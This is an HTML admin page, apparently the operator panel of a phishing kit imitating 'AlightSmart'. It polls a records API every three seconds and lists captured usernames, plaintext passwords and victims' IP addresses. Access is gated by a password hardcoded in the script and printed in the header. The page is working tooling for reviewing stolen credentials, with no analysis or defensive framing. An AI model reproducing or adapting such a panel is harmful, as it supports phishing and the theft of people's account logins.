<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
        .container { max-width: 1400px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .header { background: #1e40af; color: white; padding: 25px; text-align: center; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #e2e8f0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 AlightSmart Admin Dashboard</h1>
            <p>Password: tunde6035</p>
        </div>

        <table id="recordsTable">
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Type</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>IP</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>
    </div>

    <script>
        const ADMIN_PASSWORD = "tunde6035";

        async function loadRecords() {
            const res = await fetch('/api/records');
            const records = await res.json();
            const tbody = document.querySelector('#recordsTable tbody');
            tbody.innerHTML = "";

            records.forEach(r => {
                tbody.innerHTML += `
                    <tr>
                        <td>${r.timestamp}</td>
                        <td>${r.type}</td>
                        <td><strong>${r.username || '-'}</strong></td>
                        <td>${r.password ? `<code>${r.password}</code>` : '-'}</td>
                        <td>${r.ip || '-'}</td>
                    </tr>`;
            });
        }

        window.onload = () => {
            const pass = prompt("Enter Admin Password:");
            if (pass === ADMIN_PASSWORD) {
                loadRecords();
                setInterval(loadRecords, 3000);
            } else {
                alert("Wrong Password");
                window.location.href = "/";
            }
        };
    </script>
</body>
</html>
